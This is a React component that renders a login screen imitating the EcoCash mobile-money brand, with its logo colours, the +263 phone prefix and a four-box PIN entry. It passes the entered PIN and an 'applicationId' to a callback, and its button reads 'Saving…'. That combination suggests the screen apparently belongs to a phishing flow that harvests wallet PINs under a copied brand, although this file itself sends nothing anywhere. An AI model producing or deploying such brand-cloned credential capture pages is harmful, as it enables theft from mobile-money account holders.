import React, { useRef, useState } from 'react';
import { isValidDigitCode } from '../utils/validation';

interface PinScreenProps {
  phone: string;
  applicationId: string;
  onBack: () => void;
  onNext: (pin: string) => void;
}

export const PinScreen: React.FC<PinScreenProps> = ({ phone, applicationId, onBack, onNext }) => {
  const [pin, setPin] = useState('');
  const [pinDigits, setPinDigits] = useState<string[]>(Array(4).fill(''));
  const [error, setError] = useState<string | undefined>();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const inputRefs = useRef<Array<HTMLInputElement | null>>([]);

  const updatePin = (nextDigits: string[]) => {
    setPinDigits(nextDigits);
    setPin(nextDigits.join(''));
    if (error) setError(undefined);
  };

  const handleDigitChange = (index: number, value: string) => {
    const sanitized = value.replace(/\D/g, '').slice(-1);
    const nextDigits = [...pinDigits];
    nextDigits[index] = sanitized;
    updatePin(nextDigits);

    if (sanitized && index < 3) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleDigitKeyDown = (index: number, event: React.KeyboardEvent<HTMLInputElement>) => {
    if (event.key === 'Backspace' && !pinDigits[index] && index > 0) {
      const nextDigits = [...pinDigits];
      nextDigits[index - 1] = '';
      updatePin(nextDigits);
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault();
    if (!isValidDigitCode(pin, 4)) {
      setError('Please enter a 4-digit PIN.');
      return;
    }

    if (!applicationId) {
      setError('Application reference is missing. Please restart the application.');
      return;
    }

    setError(undefined);
    setIsSubmitting(true);
    try {
      await onNext(pin.trim());
    } finally {
      setIsSubmitting(false);
    }
  };

  const isPinComplete = pinDigits.every((digit) => digit !== '');

  return (
    <div className="min-h-screen w-full bg-white flex flex-col overflow-y-auto">
      <div className="flex flex-col items-center w-full max-w-md mx-auto px-6 pt-6 gap-6">
        <div className="flex flex-col items-center gap-3">
          <h1 className="text-4xl font-extrabold tracking-tight">
            <span className="text-[#0052CC]">Eco</span>
            <span className="text-[#E50000]">Cash</span>
          </h1>
          <p className="text-2xl font-semibold text-gray-800">Login</p>
        </div>

        <div className="w-full flex items-center gap-2 border border-[#2B7FFF] rounded-xl bg-white p-3">
          <span className="text-lg">🇿🇼</span>
          <div className="flex items-center gap-1 text-[#2B7FFF] font-semibold">
            <span>+263</span>
            <span className="text-[0.7rem]">▼</span>
          </div>
          <span className="text-slate-900 font-semibold">{phone}</span>
        </div>

        <div className="w-full text-left">
          <p className="text-sm text-gray-500">Enter your PIN</p>
        </div>

        <div className="flex gap-3 justify-center">
          {pinDigits.map((digit, index) => (
            <input
              key={index}
              ref={(element) => {
                inputRefs.current[index] = element;
              }}
              id={`pin-${index}`}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={digit}
              onChange={(event) => handleDigitChange(index, event.target.value)}
              onKeyDown={(event) => handleDigitKeyDown(index, event)}
              aria-label={`PIN digit ${index + 1}`}
              className={`h-16 w-16 rounded-2xl border text-center text-2xl font-semibold text-slate-900 focus:outline-none focus:ring-2 focus:ring-[#2B7FFF] caret-black ${
                error
                  ? 'border-red-500 focus:ring-red-500'
                  : index === 0
                  ? 'border-black'
                  : 'border-[#2B7FFF]'
              }`}
            />
          ))}
        </div>

        {error && <p className="text-center text-xs text-red-500 font-medium">{error}</p>}

        <div className="text-center mt-2">
          <a href="#" className="text-[#0052CC] font-medium underline">
            Forgot PIN?
          </a>
        </div>

        {isPinComplete && (
          <button
            type="button"
            onClick={handleSubmit}
            disabled={isSubmitting}
            className="w-full rounded-full bg-[#0052CC] px-4 py-4 mt-4 text-base font-bold text-white transition-colors hover:bg-[#0048b3] disabled:opacity-70 disabled:cursor-not-allowed"
          >
            {isSubmitting ? 'Saving…' : 'LOGIN'}
          </button>
        )}
      </div>

      <div className="w-full bg-[#0066CC] flex flex-col items-center rounded-t-[40px] pt-10 pb-8 px-6">
        <div className="text-center px-2">
          <p className="text-white text-base leading-relaxed">To register an EcoCash wallet or get assistance,</p>
          <p className="text-white text-base leading-relaxed">click below</p>
        </div>

        <div className="flex flex-row justify-center gap-4 w-full max-w-sm mt-6 mb-8">
          <div className="flex-1 rounded-2xl bg-white p-6 flex flex-col items-center justify-center shadow-md">
            <div className="flex h-12 w-12 items-center justify-center rounded-2xl bg-[#E8F1FF] text-[#0052CC] text-2xl">
              👤
            </div>
            <p className="mt-3 text-sm font-semibold text-[#0052CC] underline">Register</p>
          </div>
          <div className="flex-1 rounded-2xl bg-white p-6 flex flex-col items-center justify-center shadow-md">
            <div className="flex h-12 w-12 items-center justify-center rounded-2xl bg-[#E8F1FF] text-[#0052CC] text-2xl">
              i
            </div>
            <p className="mt-3 text-sm font-semibold text-[#0052CC] underline">Help & Support</p>
          </div>
        </div>

        <div className="text-center">
          <p className="text-white/80 text-sm mb-2">v2.13P</p>
          <p className="text-white/90 text-xs text-center">
            By signing in you agree to the <span className="underline">Terms and Conditions</span>
          </p>
        </div>
      </div>
    </div>
  );
};
